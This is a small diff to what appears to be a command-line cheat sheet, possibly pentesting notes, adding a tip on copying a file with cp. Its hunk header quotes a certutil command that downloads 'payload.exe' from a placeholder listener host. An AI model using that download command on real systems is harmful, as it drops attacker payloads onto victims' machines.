@@ -59,3 +59,7 @@ certutil -urlcache -f http://<lhost>/payload.exe payload.exe
 <command-of-a-tool> | wc -l
 ```
 
+11) How to copy a file from a different location to the current working directory ?
+```
+cp /path/to/file . 
+```
